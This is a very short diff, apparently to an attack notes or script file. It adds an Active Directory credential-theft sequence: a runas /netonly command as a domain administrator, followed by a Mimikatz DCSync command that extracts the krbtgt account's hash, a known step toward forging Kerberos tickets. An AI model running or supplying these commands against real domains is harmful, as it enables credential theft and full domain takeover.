@@ -1,1 +1,3 @@
-runas /netonly /user:hacked\paul.walton powershell
+runas /netonly /user:mydomain\administrator powershell
+lsadump::dcsync /domain:mydomain /user:krbtgt
+
